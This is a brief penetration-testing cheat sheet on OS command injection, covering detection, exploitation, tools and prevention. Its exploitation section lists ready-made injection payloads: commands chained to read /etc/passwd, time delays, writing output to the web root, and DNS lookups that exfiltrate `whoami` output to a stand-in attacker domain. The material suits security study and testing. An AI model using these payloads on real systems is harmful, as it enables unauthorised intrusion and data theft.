# Command Injection

### How to Find

#### Black-Box Testing

* Map the application (Using Burp)
  * Identify all instances where the web application appears to be interacting with the underlying operating system
* Fuzz the application
  * Shell metacharacters: `&`, `&&`, `|`, `||`, `;`, `\n`, `` ` ``, `$()`.
* For in-band command injection, analyze the response of the application to determine if it's vulnerable.
* For blind command injection, you need to get creative.
  * Trigger a time delay using the ping or sleep command.
  * Output the response of the command in the web root and retrieve the file directly using a browser.
  * Open an out-of-band channel back to a server you control.

#### White-Box Testing

* Perform a combination of black box and white-box testing
* Map all input vectors in the application.
* Review source code to determine if any of the input vectors are added as parameters to functions that execute system commands.

### How to Exploit

#### In-band

* Shell metacharacters: `&`, `&&`, `|`, `||`, `;`, `\n`, `` ` ``, `$()`.
* Concatenate another commands
  * `127.0.0.1 && cat /etc/passwd &`
  * `127.0.0.1 & cat /etc/passwd &`
  * `127.0.0.1 || cat /etc/passwd &`

#### Blind

* Shell metacharacters: `&`, `&&`, `|`, `||`, `;`, `\n`, `` ` ``, `$()`.
* Trigger a time delay.
  * `127.0.0.1 && sleep 10 &`
  * `127.0.0.1 ping -c 10 127.0.0.1 &`
* Output the response of the command in the web root and retrieve the file directly using a browser
  * `127.0.0.1 & whoami > /var/www/static/whoami.txt &`
* Open an out-of-band channel back to a server you control.
  * `127.0.0.1 & nslookup asdfjkl.web-attacker.com &`
  * ``127.0.0.1 & nslookup `whoami` .asdfjkl.web-attacker.com &``

### Automate Exploitation Tools

* Burp Suite
* arachni
* OWASP Zap
* Wapiti
* acunetix
* w3af

### How to Prevent

The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. Instead, implement the required functionality using safer platform APIs.

* For example: use `mkdir()` instead of `system("mkdir /dir_name")`

If it is required to perform OS commands using user-supplied input, then strong input validation must be performed.

* Validate against a whitelist of permitted values.
* Validate that the input is as expected or valid input.

